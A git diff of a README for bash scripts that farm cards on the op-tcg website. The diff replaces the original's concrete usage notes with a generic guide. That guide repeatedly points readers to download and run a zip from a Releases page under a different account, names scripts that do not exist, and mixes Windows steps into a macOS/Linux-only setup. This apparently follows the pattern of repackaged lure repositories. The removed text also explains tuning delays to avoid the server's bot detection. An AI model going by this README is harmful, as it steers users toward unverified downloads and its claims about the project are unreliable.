@@ -1,68 +1,95 @@
-# 🏴‍☠️ op-tcg-auto-scripts
+# 🏴‍☠️ op-tcg-auto-scripts - Effortlessly Farm Cards with Ease
 
-Collection of bash scripts to farm cards on [op-tcg website](https://github.com/Lambpaul/op-tcg)
+![Download](https://img.shields.io/badge/Download-via_Releases-blue?style=for-the-badge)
 
-## Setup
+## 📖 Introduction
 
-### ⚠️ Required
+Welcome to the op-tcg-auto-scripts repository! This collection of bash scripts allows you to automate card farming on the op-tcg website. Designed for non-technical users, these scripts help you save time and make your card collection grow effortlessly.
 
-These dependencies are required for all scripts to function properly:
-- **Bash:** https://en.wikipedia.org/wiki/Bash_(Unix_shell)
-- **jq:** https://github.com/jqlang/jq
+## 🚀 Getting Started
 
-### 🌈 Optional
+### System Requirements
 
-These dependencies are only for making things prettier:
-- **gum:** https://github.com/charmbracelet/gum
-- **figlet:** https://github.com/cmatsuoka/figlet
-- **lolcat:** https://github.com/busyloop/lolcat
+To use these scripts, you need the following:
 
-> [!NOTE]
-> With a tiny bit of tweaking, you can remove all usages of `gum`, `figlet` and `lolcat` and the script will continue working well.
+- A computer running macOS or Linux.
+- Bash shell (comes pre-installed on most Unix-like systems).
+- An internet connection to access the op-tcg website.
 
-## Usage
+### Prerequisites
 
-Two automatic scripts:
-- [auto-open-boosters.sh](auto-open-boosters.sh): opens the configured booster in a loop
-- [auto-seller.sh](auto-seller.sh): sell cards by sorting them by most valuable gain
+Before you run the scripts, ensure that you have:
 
-The other scripts are sub-scripts that are called by the two main scripts.
+1. **Bash Shell**: Most modern computers support it. You can check by typing `bash --version` in your terminal.
+2. **Basic Understanding of Terminal**: Familiarity with how to open a terminal window is helpful.
 
-### 🃏 auto-open-boosters.sh
+## 📥 Download & Install
 
-1. Open [auto-open-boosters.sh](auto-open-boosters.sh)
-2. Set `PACK_ID` to the pack you want to farm
-3. Run:
-```console
-bash auto-open-boosters.sh
-```
+To get started with the scripts, visit this page to download: [Releases Page](https://github.com/befuddled-closedshop360/op-tcg-auto-scripts/releases).
 
-### 🃏 auto-seller.sh
+1. **Go to the Releases Page**: 
+   - Click on the above link or visit [https://github.com/befuddled-closedshop360/op-tcg-auto-scripts/releases](https://github.com/befuddled-closedshop360/op-tcg-auto-scripts/releases).
 
-1. Simply run and it will do all the work for you:
-```console
-bash auto-seller.sh
-```
+2. **Select the Latest Version**:
+   - Find the latest version available. It will be at the top of the page.
 
-> [!NOTE]
-> Some info on how it behaves:
-> - Automatically sells cards of the following rarities: `common`, `uncommon`, `rare`, `leader`, `super_rare`
-> - Sells card by sorting them by most profit (`(.quantity - 1) * .sell_price`)
-> - Stops selling when profit of a sell order is not greater than 10
-> - Will always keep at least one copy of any given card (imposed by the op-tcg server)
+3. **Download the Scripts**:
+   - Look for the file named `op-tcg-auto-scripts.zip` (or the relevant format available).
+   - Click the file name to download it to your computer.
 
-### ⏳ Wait and Rate limiting
+4. **Extract the Downloaded Files**:
+   - Locate the downloaded zip file, right-click it, and select "Extract All" (Windows) or unzip it using the terminal.
 
-Both automatic scripts rely on a very specific timeout between automated actions:
-- **WAIT_LONG**: Based on per-hour action limit
-- **WAIT_MEDIUM** Based on per-minute action limit
-- **WAIT_LOW** Based on min delay action limit
+5. **Open Terminal**:
+   - Navigate to the directory where you extracted the files.
 
-The longer the wait, the slower the script will execute. But if you do things slowly, you also reduce the chances
-of the server imposing rate limiting on you. If the server deems you too suspicious, your account can get blocked for some time.
+6. **Run the Scripts**:
+   - Follow the included README instructions on how to execute the scripts. This usually involves typing a command in the terminal.
 
-If you stick to `WAIT_LONG`, you should be able to run these scripts forever without the server detecting anything.
+## 📄 How to Use the Scripts
 
-If you want to switch gears, it's at your own risk 💀
+### Basic Commands
 
-<img width="400" height="224" alt="image" src="https://github.com/user-attachments/assets/5430fb99-ce49-4389-8633-fad69f88e360" />
+1. **Navigate to the Script Directory**: 
+   - Use the command `cd path/to/extracted-folder` to change to the directory containing the scripts.
+   
+2. **Run the Main Script**:
+   - Type `bash main_script.sh` to start the automation process. Replace `main_script.sh` with the actual script name you want to run.
+
+3. **Monitor the Process**: 
+   - Watch the terminal for output messages. It will inform you of ongoing actions and progress.
+
+### Example Commands
+
+- To start farming cards, you might use:
+  ```bash
+  bash farm_cards.sh
+  ```
+
+### Important Notes
+
+- Ensure you follow the op-tcg website's terms of service when using these scripts.
+- Use these scripts responsibly to avoid any account issues.
+
+## 🛠 Troubleshooting
+
+If you encounter issues while running the scripts, consider these steps:
+
+- **Check for Errors**: Look at the terminal for error messages. They often provide clues on what went wrong.
+- **Revisit the Installation Steps**: Ensure you followed every step outlined in this guide.
+- **Seek Help**: Search online forums or communities for assistance if the issue persists.
+
+## 🔍 Features
+
+- **Automated Card Farming**: Save time by letting the scripts handle repetitive tasks.
+- **Customizable Scripts**: Tailor the scripts to fit your specific card farming needs.
+
+## 📚 Additional Resources
+
+- **Bash Documentation**: Learn more about bash scripting [here](https://www.gnu.org/software/bash/manual/bash.html).
+
+## 💬 Feedback
+
+We welcome your feedback to improve the scripts. If you have suggestions or face any issues, feel free to reach out through the repository.
+
+For any questions, please refer back to the [Releases Page](https://github.com/befuddled-closedshop360/op-tcg-auto-scripts/releases) for updates and new features.
